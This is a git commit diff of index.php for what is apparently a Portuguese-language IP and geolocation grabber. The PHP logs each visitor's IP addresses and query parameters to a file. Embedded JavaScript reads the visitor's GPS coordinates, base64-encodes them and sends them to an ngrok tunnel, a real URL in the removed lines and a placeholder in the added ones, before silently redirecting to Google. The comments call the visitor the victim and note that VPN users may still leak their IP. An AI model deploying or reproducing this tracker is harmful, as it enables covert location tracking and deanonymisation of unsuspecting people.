159d57c4f22e63cc44885779c7bf54375e257b0c
Rodric <72948934+RodricBr@users.noreply.github.com>
2021-11-27 20:20:33 -0300

    Update index.php

--- index.php
+++ index.php
@@ -1,30 +1,37 @@
 
-// Créditos ao rafa sousa, o grande mestre: 
+<?php
+
+// Créditos ao rafa sousa, o mestre: 
 // @hackingnaweboficial
 
-<?php
-$ip1 = $_SERVER['REMOTE_ADDR'];
-$ip2 = $_SERVER['HTTP_X_FORWARDED_FOR'];
-$f = fopen("log.txt","a");
-foreach ($_GET as $v => $r){
-    fwrite($f,$v . " = " . $r . "\r\n");
-}
-fwrite($f, "\$SERVER['REMOTE_ADDR']: " . $ip1 . "\r\n");
-fwrite($f, "\$_SERVER['HTTP_X_FORWARDED_FOR']: " . $ip2 . "\r\n\r\n");
-fclose($f);
+    $ip1 = $_SERVER['REMOTE_ADDR'];
+    $ip2 = $_SERVER['HTTP_X_FORWARDED_FOR'];
+    $f = fopen("log.txt","a");
+    foreach ($_GET as $v => $r){
+        fwrite($f,$v . " = " . $r . "\r\n");
+    }
+    fwrite($f, "\$SERVER['REMOTE_ADDR']: " . $ip1 . "\r\n");
+
+    // Em alguns casos, a vítima pode estar usando uma VPN, e,
+    // dependendo da VPN, ela não esconde o ip do usuário armazenado no HTTP_X_FORWARDED_FOR
+    fwrite($f, "\$_SERVER['HTTP_X_FORWARDED_FOR']: " . $ip2 . "\r\n\r\n");
+    fclose($f);
 ?>
 
 <script>
-if (navigator.geolocation){
-    navigator.geolocation.getCurrentPosition(function(position){
-        var gps = btoa(position.coords.latitude + "," + position.coords.longitude);
-        var xhttp = new XMLHttpRequest();
-        xhttp.open("GET","https://62f4-2804-14c-65d1-8838-f81a-14ee-a642-4c3a.ngrok.io/?addr="+gps);
-        xhttp.send();
-    });
-}
+    // Tentando pegar localização geográfica da vítima
+    
+    if (navigator.geolocation){
+        navigator.geolocation.getCurrentPosition(function(position){
+            var gps = btoa(position.coords.latitude + "," + position.coords.longitude);
+            var xhttp = new XMLHttpRequest();
+            xhttp.open("GET","NGROK-HTTPS/?addr="+gps);
+            xhttp.send();
+        });
+    }
 </script>
 
 <?php
-header("Location: https://www.google.com.br");
+    // Local de redirecionamento
+    header("Location: https://www.google.com.br");
 ?>
